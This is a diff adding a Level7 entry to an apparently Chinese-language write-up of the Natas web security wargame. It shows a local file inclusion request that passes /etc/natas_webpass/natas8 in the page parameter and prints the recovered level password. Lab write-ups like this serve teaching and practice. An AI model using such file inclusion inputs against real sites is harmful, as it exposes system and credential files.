@@ -85,3 +85,16 @@ PHP源码
 ```
 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
 ```
+
+# Level7
+
+提示信息
+{% gist hrl/33a47d19678b2f15264f %}
+
+注意到主页的uri是 `/index.php?page=home`
+
+尝试访问 `/index.php?page=/etc/natas_webpass/natas8` ，得到natas8的密码
+
+```
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+```
